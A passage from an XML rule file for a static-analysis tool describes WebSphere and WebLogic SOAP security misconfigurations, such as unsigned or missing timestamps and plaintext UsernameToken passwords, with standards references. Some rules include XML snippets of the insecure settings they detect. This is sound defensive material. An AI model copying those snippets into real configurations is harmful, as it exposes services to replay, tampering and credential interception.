																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_outbound_signature
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Outbound Signature
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Outbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the knowledge of the sender or the receiver. Without a signature, the receiver cannot cryptographically verify that the contents of a message really originated with the sender.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_outbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Outbound Timestamp
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_timestamp_expiration
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Timestamp Expiration
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Timestamp
			Expiration
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A SOAP message with a timestamp that does not expire is vulnerable to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a timestamp expires, any security semantics sent with the timestamp should expire as well. Therefore, timestamps without an expiration could allow security semantics (such as UsernameToken credentials) to remain valid indefinitely.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_outbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Outbound WS-Security Not Enabled
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Outbound
			WS-Security Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Requests that do not use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidential regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and builds security into the message.<br><br> The absence of an <code>&lt;securityRequestGeneratorServiceConfig&gt;</code> tag in the IBM WebSphere WS-Security client deployment descriptor extension file indicates that outbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[23]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_unsigned_inbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Unsigned Inbound Timestamp
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Unsigned Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following client configuration tells WebSphere to accept unsigned timestamps:<br><pre><br>&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;<br>        ...<br>        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;<br>            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;<br>            ...<br>&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_unsigned_outbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Unsigned Outbound Timestamp
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Unsigned Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following client configuration tells WebSphere to send unsigned timestamps:<br><pre><br>&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;<br>        ...<br>        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;<br>          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;<br>          ...<br>&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_weak_token
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Weak Token
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sending clear text passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following WebSphere client configuration uses the UsernameToken:<br><pre><br>&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1151349988084&quot;&gt;<br>...<br>        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1154318832968&quot;&gt;<br>          &lt;securityToken xmi:id=&quot;SecurityToken_1211395747219&quot; name=&quot;basicauth&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken&quot;/&gt;<br>...<br>&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4, Requirement 8.2.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[22]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_weblogic_misconfiguration_missing_timestamp</key>
		<internalKey>Environment/Weblogic Misconfiguration/Missing Timestamp
		</internalKey>
		<name>Weblogic Misconfiguration: Missing Timestamp</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates the freshness of a message's security data. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker could intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can trick a recipient into accepting a malicious message.<br><br><b>Example 1:</b> The following policy entry has the <code>&lt;MessageAge&gt;</code> tag commented out.<br><pre><br>&lt;wsp:Policy<br>  xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy"<br>  xmlns:wssp="http://www.bea.com/wls90/security/policy"<br>  xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"<br>  &gt;<br>...<br>&lt;!--   &lt;wssp:MessageAge/&gt; --&gt;<br><br>&lt;/wsp:Policy&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
